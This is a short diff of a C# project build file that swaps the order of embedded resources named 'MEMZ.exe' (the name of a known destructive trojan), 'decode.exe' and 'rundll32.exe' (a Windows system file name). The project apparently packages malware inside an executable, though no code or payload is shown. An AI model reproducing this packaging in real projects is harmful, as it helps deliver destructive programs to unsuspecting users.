@@ -80,13 +80,13 @@
     </Compile>
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="Resources\rundll32.exe" />
+    <EmbeddedResource Include="Resources\MEMZ.exe" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="Resources\decode.exe" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="Resources\MEMZ.exe" />
+    <EmbeddedResource Include="Resources\rundll32.exe" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
